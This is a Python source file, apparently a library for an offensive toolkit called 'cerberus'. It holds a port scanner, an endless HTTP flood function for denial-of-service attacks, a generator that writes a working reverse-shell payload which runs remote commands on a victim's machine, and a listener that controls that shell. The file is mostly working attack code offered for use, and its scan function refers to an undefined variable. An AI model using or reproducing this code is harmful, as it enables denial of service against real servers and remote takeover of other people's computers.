# Library for cerberus usage in scripts

import socket

def scan(target):
    
    open_ports = []
    
    target = socket.gethostbyname(address)
        
    for port in range(1,65535):
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(5)
        
        result = s.connect_ex((target, port))
        
        if result == 0:
            
            open_ports.append(port)
            
        s.close()
    
    return open_ports

def flood(source, target, port, masked):
    
    try:
        
        while True:
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('utf-8'), (target, port))
            s.sendto(("Host: " + masked + "\n\r\r\n").encode('utf-8'), (target, port))
            
            global number_of_requests
            number_of_requests += 1

            if number_of_requests % 128 == 0:
                
                print(f'{number_of_requests} requests', end='\r')
            
            s.close()

    except:
        
        pass

def generate_payload(host, port, path):
     
    shell_payload = """from subprocess import check_output
import socket
import time
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('""" + host + """', """ + port + """))

s.send(os.getcwd().encode('utf-8'))

while True:
    command = s.recv(2048).decode('utf-8')
    try:
        output = str(check_output(command, shell=True)).replace("\\\\n", "\\n").replace("\\\\r", "").replace("\\\\\\\\", "\\\\")[2:-1]
        if command.split(" ", 1)[0] == "cd":
            os.chdir(command.split(" ", 1)[1])
        time.sleep(0.05)
        s.send(f"CWD {os.getcwd()}".encode('utf-8'))
        if output == "":
            time.sleep(0.05)
            s.send("  MESSAGE END".encode('utf-8'))
        else:
            time.sleep(0.05)
            s.send(f"{output}  MESSAGE END".encode('utf-8'))
    except:
        time.sleep(0.05)
        s.send(f"CWD {os.getcwd()}".encode('utf-8'))
        time.sleep(0.05)
        s.send("error MESSAGE END".encode('utf-8'))"""
  
    with open(path, 'w') as file:
  
        file.write(shell_payload)

def listen(host, port):
    
    try:
    
        print("\033[36m[*] listening for connections\033[39m")
        
        try:

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((host, port))

            s.listen(5)

            client_s, ip_address = s.accept()
            
            print(f"{ip_address[0]} connected\n")
            
            current_directory = client_s.recv(2048).decode('utf-8')

            while True:
                command = input(f"\033[31m{ip_address[0]}\033[39m: {current_directory}>")
                if command != "":
                    client_s.send(command.encode('utf-8'))
                    directory_recv = client_s.recv(2048).decode('utf-8')
                    if directory_recv[:3] == "CWD":
                        current_directory = directory_recv[4:]
                    output = "MESSAGE BEGIN "
                    while output[-11:] != "MESSAGE END":
                        output = output + client_s.recv(2048).decode('utf-8')
                    print(output[14:-12])
        
        except:
            
            print("\033[31m\n[!] session quit unexpectedly\033[39m\n")
            
    except:
        
        print("\033[31m\n[!] command error\033[39m\n")